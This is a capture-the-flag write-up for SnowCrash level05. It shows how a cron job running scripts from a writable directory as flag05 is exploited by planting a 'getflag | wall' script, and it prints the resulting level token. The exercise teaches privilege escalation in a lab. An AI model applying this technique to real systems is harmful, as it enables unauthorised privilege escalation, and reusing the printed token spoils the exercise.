# Objective

As `level05`, the goal is to exploit a vulnerability to gain `flag05`'s privileges and read the flag, which is the password for `level06`.

The flag is gained through the command `getflag`, run as `flag05`.

```sh
level05@SnowCrash:~$ ll -la /bin/getflag
-rwxr-xr-x 1 root root 11833 Aug 30  2015 /bin/getflag*
```

# Content of home

This level doesn't explicitly provide a file to be exploited.

```sh
level05@SnowCrash:~$ pwd
/home/user/level05

level05@SnowCrash:~$ ll
total 12
dr-xr-x---+ 1 level05 level05  100 Mar  5  2016 ./
d--x--x--x  1 root    users    340 Aug 30  2015 ../
-r-x------  1 level05 level05  220 Apr  3  2012 .bash_logout*
-r-x------  1 level05 level05 3518 Aug 30  2015 .bashrc*
-r-x------  1 level05 level05  675 Apr  3  2012 .profile*
```

# Further inquiry

### Files

```sh
level05@SnowCrash:~$ find / -user flag05 2> /dev/null
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
```

```sh
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```

### Mail

At some point, upon connection, we receive an unexpected message:

```sh
level05@localhost's password: 
You have new mail.
```

On Linux, two places hold mail.

```sh
level05@SnowCrash:~$ echo $MAIL
/var/mail/level05

level05@SnowCrash:~$ ll $MAIL
-rw-r--r--+ 1 root mail 58 Oct  6 10:19 /var/mail/level05

level05@SnowCrash:~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

Or

```sh
level05@SnowCrash:~$ ll /var/spool/mail/$USER
-rw-r--r--+ 1 root mail 58 Oct  6 10:19 /var/spool/mail/level05

level05@SnowCrash:~$ cat /var/spool/mail/$USER
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

# Resolution

The cron entry runs every script found in `/opt/openarenaserver/` as `flag05`, then deletes it. We just need to drop a script there before it gets picked up. Since the script runs as `flag05` but outside of any terminal we control, we can't simply read its stdout: `wall` broadcasts a message to every open terminal, which lets us recover the flag regardless.

```sh
level05@SnowCrash:~$ cat > openarena_exploit.sh
getflag | wall

level05@SnowCrash:~$ cp openarena_exploit.sh /opt/openarenaserver/
level05@SnowCrash:~$ ll /opt/openarenaserver/
total 4
drwxrwxr-x+ 2 root    root    60 Oct  6 17:30 ./
drwxr-xr-x  1 root    root    60 Oct  6 10:19 ../
-rw-rw----+ 1 level05 level05 15 Oct  6 17:30 openarena_exploit.sh
```

And wait 2 minutes maximum.

```sh
Broadcast Message from flag05@Snow                                             
        (somewhere) at 17:32 ...                                               
                                                                               
Check flag.Here is your token : viuaaale9huek52boumoomioc 

level05@SnowCrash:~$ su - level06
Password: # viuaaale9huek52boumoomioc
```